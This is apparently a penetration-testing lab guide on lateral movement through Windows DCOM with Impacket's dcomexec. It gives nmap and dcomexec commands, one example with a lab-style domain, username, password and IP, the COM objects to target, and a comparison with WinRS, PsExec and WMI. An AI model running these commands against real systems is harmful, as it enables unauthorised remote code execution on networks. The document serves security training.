## **DCOM — Distributed Component Object Model**

DCOM allows Windows applications and components to communicate across a network.

For lateral movement, attackers can abuse remotely accessible COM objects to execute commands on another machine.

The tool you'll encounter is Impacket's `dcomexec.py`.

### **Requirements**

- TCP 135 (RPC Endpoint Mapper) reachable.
- Dynamic RPC ports reachable.
- DCOM enabled and appropriately configured.
- Valid credentials.
- Sufficient remote permissions, commonly local administrative rights for the execution methods used.

Unlike WinRM, DCOM does not require port 5985 or 5986.

### **Step 1 — Check RPC availability**
```
nmap -sV -p 135 <TARGET_IP>
```

Remember: port 135 being open does not prove that DCOM execution will succeed. RPC uses additional dynamic ports.
### **Step 2 — Execute through DCOM**
```
impacket-dcomexec DOMAIN/USER:PASSWORD@<TARGET_IP>
```
Example:
```
impacket-dcomexec laser.com/Eric.Wallows:'EricLikesRunning800'@192.168.245.174
```

You can specify the execution object:
```
impacket-dcomexec -object MMC20 DOMAIN/USER:PASSWORD@<TARGET_IP>
```

Other commonly encountered objects include:

- `ShellWindows`
- `ShellBrowserWindow`
- `MMC20`

The exact supported object and execution method depend on the Impacket version.

### **Step 3 — Execute commands**

Once connected, you can execute commands through the remote DCOM mechanism.

For example:

```
whoami
hostname
ipconfig
```

### **What makes DCOM different?**

| Method | Main network requirement             |
| ------ | ------------------------------------ |
| WinRS  | TCP 5985 / 5986                      |
| DCOM   | TCP 135 + dynamic RPC                |
| PsExec | TCP 445                              |
| WMI    | RPC, typically TCP 135 + dynamic RPC |